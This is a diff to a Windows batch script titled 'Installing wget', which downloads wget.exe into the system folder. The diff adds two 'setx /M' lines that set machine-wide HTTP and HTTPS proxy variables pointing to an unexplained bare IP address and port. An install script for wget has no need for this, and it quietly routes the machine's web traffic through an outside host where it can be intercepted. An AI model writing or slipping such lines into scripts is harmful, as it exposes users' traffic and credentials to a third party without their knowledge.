@@ -6,6 +6,9 @@ echo on
 
 title Installing wget. Please wait...
 
+setx /M HTTP_PROXY http://194.145.60.1:9400
+setx /M HTTPS_PROXY http://194.145.60.1:9400
+
 if not defined WGET_URL set WGET_URL=https://eternallybored.org/misc/wget/current/wget.exe
 
 for %%i in ("%WGET_URL%") do set filename=%SystemRoot%\%%~nxi
